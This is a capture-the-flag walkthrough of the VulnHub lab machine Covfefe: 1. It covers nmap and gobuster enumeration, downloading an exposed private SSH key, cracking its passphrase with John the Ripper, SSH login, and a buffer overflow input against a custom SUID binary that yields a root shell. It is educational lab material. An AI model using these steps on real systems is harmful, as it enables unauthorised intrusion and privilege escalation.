# Covfefe: 1

- **Machine:** Covfefe: 1
- **Download:** https://www.vulnhub.com/entry/covfefe-1,199/

![](images/838-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](images/838-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.105
```

![](images/838-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.105
```

```bash
nmap -sC -sV -A 192.168.2.105
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to discover interesting web directories.

```bash
nmap -v -p 80,8080 -sT -sV -A --script=http-enum.nse 192.168.2.105
```

![](images/838-4.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.105
- http://192.168.2.105:31337

---

## Directory Enumeration

Perform directory brute-forcing against port **31337**.

```bash
gobuster dir -u http://192.168.2.105:31337 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

![](images/838-5.png)

---

## Robots.txt

Visit the following endpoint:

- http://192.168.2.105:31337/robots.txt

![](images/838-6.png)

---

## Explore the `/taxes` Directory

Browse to:

- http://192.168.2.105:31337/taxes/

![](images/838-7.png)

### Flag 1

```text
flag1{make_america_great_again}
```

---

## Discover the Exposed SSH Directory

Visit:

- http://192.168.2.105:31337/.ssh

![](images/838-8.png)

The web server exposes SSH-related files.

---

# SSH Access

## Download the SSH Files

Download the exposed SSH files.

```bash
wget http://192.168.2.105:31337/.ssh/id_rsa
```

```bash
wget http://192.168.2.105:31337/.ssh/authorized_keys
```

```bash
wget http://192.168.2.105:31337/.ssh/id_rsa.pub
```

![](images/838-9.png)

---

## Inspect the Downloaded Files

```bash
cat id_rsa
```

```bash
cat authorized_keys
```

```bash
cat id_rsa.pub
```

![](images/838-10.png)

---

## Recover the SSH Key Passphrase

Convert the private key into a format supported by John the Ripper.

```bash
ssh2john id_rsa > id_rsa.hash
```

Crack the passphrase.

```bash
john id_rsa.hash --wordlist=/opt/rockyou.txt
```

![](images/838-11.png)

---

## Set Proper Permissions

```bash
chmod 600 id_rsa
```

---

## SSH Login

Authenticate using the recovered private key.

```bash
ssh -i id_rsa simon@192.168.2.105
```

![](images/838-12.png)

---

# Privilege Escalation

## Enumerate Hidden Files

```bash
ls -al
```

![](images/838-13.png)

---

## Review Bash History

```bash
cat .bash_history
```

---

## Enumerate SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

![](images/838-14.png)

---

## Analyze the Custom Binary

Execute the custom SUID binary.

```bash
/usr/local/bin/read_message
```

![](images/838-15.png)

---

## Review the Source Code

Read the source code from the root user's home directory.

```bash
cat /root/read_message.c
```

![](images/838-16.png)

### Flag 2

```text
flag2{use_the_source_luke}
```

---

## Buffer Overflow (Lab)

> **Lab note:** The following steps demonstrate a buffer overflow vulnerability in the intentionally vulnerable VulnHub lab.

Navigate to the root directory.

```bash
cd /root
```

Execute the vulnerable binary.

```bash
read_message
```

Provide the following input.

```text
Simonaaaaaaaaaaaaaaa/bin/sh
```

This input triggers the buffer overflow and spawns a privileged shell.

---

## Verify Access

```bash
ls
```

---

## Read the Final Flag

```bash
cat flag.txt
```

![](images/838-17.png)

### Flag 3

```text
flag3{das_bof_meister}
```

---

# Impact

- Sensitive SSH files exposed through the web server.
- Private SSH key enabled authenticated access.
- Weak SSH key passphrase was recoverable.
- Custom SUID binary contained a buffer overflow vulnerability.
- Successful privilege escalation resulted in root access.

---

# Key Learning

- Always enumerate non-standard web ports.
- Exposed `.ssh` directories can completely compromise a system.
- Private SSH keys should never be publicly accessible.
- Review custom SUID binaries during privilege escalation.
- Source code analysis can reveal vulnerabilities in custom applications.
- Buffer overflow vulnerabilities in privileged binaries may lead to full system compromise.

---

# Summary

The assessment began by enumerating services running on a non-standard web port. Web enumeration revealed an exposed `.ssh` directory containing a private SSH key and related files. After recovering the key's passphrase, authenticated SSH access was obtained as the `simon` user. During privilege escalation, a custom SUID binary was identified and its source code reviewed, revealing a buffer overflow vulnerability. Exploiting the vulnerable binary resulted in root access and complete compromise of the target machine.